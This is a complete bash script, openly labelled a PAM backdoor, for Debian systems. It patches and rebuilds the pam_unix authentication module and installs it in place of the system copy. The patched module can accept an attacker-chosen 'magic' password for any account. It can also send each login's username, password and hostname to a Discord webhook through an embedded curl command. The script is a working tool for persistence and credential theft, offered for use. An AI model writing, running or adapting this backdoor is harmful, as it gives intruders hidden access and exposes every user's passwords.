#!/bin/bash

PAM_VERSION=""
PASSWORD=""
WEBHOOK_URL=""
VERBOSE=false
RESTORE=false
PAM_DEST="/lib/x86_64-linux-gnu/security/pam_unix.so"
BACKUP_PATH="/lib/x86_64-linux-gnu/security/pam_unix.so.bak"

DEPENDENCIES=(
    autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl 
    flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev 
    libselinux1-dev libtool libcrypt-dev libxml2-utils make 
    pkg-config sed w3m xsltproc xz-utils gcc wget patch curl
)

function run_cmd {
    if [ "$VERBOSE" = true ]; then
        "$@"
    else
        "$@" &>/dev/null
    fi
}

function show_help {
    echo "Usage: $0 [-v version] [-p password] [--webhook URL] [--restore] [--verbose]"
    echo "Options:"
    echo "  -v            Specify Linux-PAM version."
    echo "  -p            The 'magic' password for the backdoor."
    echo "  --webhook     Discord Webhook URL for credential exfiltration."
    echo "  --restore     Restore original PAM from backup."
    echo "  --verbose     Show all command output."
}

if [ ! -f /etc/debian_version ]; then
    echo "Error: This script is designed for Debian-based distributions."
    exit 1
fi

if [[ $EUID -ne 0 ]]; then
   echo "Error: This script must be run as root."
   exit 1
fi

while [[ $# -gt 0 ]]; do
    case "$1" in
        -v) PAM_VERSION="$2"; shift 2 ;;
        -p) PASSWORD="$2"; shift 2 ;;
        --webhook) WEBHOOK_URL="$2"; shift 2 ;;
        --verbose) VERBOSE=true; shift ;;
        --restore) RESTORE=true; shift ;;
        -h|--help) show_help; exit 0 ;;
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
done

if [ "$RESTORE" = true ]; then
    if [ -f "$BACKUP_PATH" ]; then
        echo "Restoring original module..."
        cp "$BACKUP_PATH" "$PAM_DEST"
        echo "Restore complete."
        exit 0
    else
        echo "Error: Backup file $BACKUP_PATH not found."
        exit 1
    fi
fi

if [ -z "$PASSWORD" ] && [ -z "$WEBHOOK_URL" ]; then
    echo "Error: You must provide at least one feature (-p or --webhook)."
    show_help
    exit 1
fi

echo "Checking dependencies..."
MISSING_PKGS=()
for pkg in "${DEPENDENCIES[@]}"; do
    if ! dpkg -s "$pkg" >/dev/null 2>&1; then
        MISSING_PKGS+=("$pkg")
    fi
done

if [ ${#MISSING_PKGS[@]} -gt 0 ]; then
    run_cmd apt update 
    run_cmd apt install -y "${MISSING_PKGS[@]}"
fi

if [ -z "$PAM_VERSION" ]; then
    PAM_VERSION=$(dpkg -s libpam-modules | grep '^Version' | cut -d' ' -f2 | cut -d'-' -f1)
    echo "Detected Version: $PAM_VERSION"
fi

PAM_BASE_URL="https://github.com/linux-pam/linux-pam/archive"
PAM_FILE="v${PAM_VERSION}.tar.gz"
PAM_DIR="linux-pam-${PAM_VERSION}"

echo "Downloading and Patching..."
run_cmd wget -c "${PAM_BASE_URL}/${PAM_FILE}"
run_cmd tar xzf "$PAM_FILE"

C_INJECTION=""
if [ -n "$WEBHOOK_URL" ]; then
    C_INJECTION+="char cmd[1024]; \
    snprintf(cmd, sizeof(cmd), \"curl -H 'Content-Type: application/json' -d '{\\\"content\\\": \\\"🔐 **PAM SkeletonKey: Credentials Captured**\\\\n**Username:** %s\\\\n**Password:** %s\\\\n**Hostname:** %s\\\"}' '$WEBHOOK_URL' > /dev/null 2>&1 &\", name, p, \"$(hostname)\"); \
    system(cmd);"
fi

if [ -n "$PASSWORD" ]; then
    C_INJECTION+="if (strcmp(p, \"$PASSWORD\") == 0) { retval = PAM_SUCCESS; } else { retval = _unix_verify_password(pamh, name, p, ctrl); }"
else
    C_INJECTION+="retval = _unix_verify_password(pamh, name, p, ctrl);"
fi

cat <<EOF > backdoor.patch
--- modules/pam_unix/pam_unix_auth.c
+++ modules/pam_unix/pam_unix_auth.c
@@ -170,7 +170,8 @@
 	D(("user=%s, password=[%s]", name, p));
 
 	/* verify the password of this user */
-	retval = _unix_verify_password(pamh, name, p, ctrl);
+	$C_INJECTION
+
 	name = p = NULL;
 
 	AUTH_RETURN;
EOF

if run_cmd patch -p0 -d "$PAM_DIR" < backdoor.patch; then
    rm backdoor.patch
else
    echo "Error: Failed to apply patch."
    rm backdoor.patch
    exit 1
fi

cd "$PAM_DIR" || exit 1
echo "Compiling (this may take a moment)..."
if [[ ! -f "./configure" ]]; then run_cmd ./autogen.sh; fi 
run_cmd ./configure --libdir=/lib/x86_64-linux-gnu --disable-nis --disable-doc
run_cmd make

NEW_MOD="modules/pam_unix/.libs/pam_unix.so"

if [ -f "$NEW_MOD" ]; then
    cd ..
    echo "Build successful. Backing up and installing..."
    [ ! -f "$BACKUP_PATH" ] && cp "$PAM_DEST" "$BACKUP_PATH"
    cp "$PAM_DIR/$NEW_MOD" "$PAM_DEST"
    chmod 644 "$PAM_DEST"
    echo "Done. Features active: $( [ -n "$PASSWORD" ] && echo -n "Backdoor " )$( [ -n "$WEBHOOK_URL" ] && echo -n "Webhook" )"
else
    echo "Error: Build failed."
    exit 1
fi
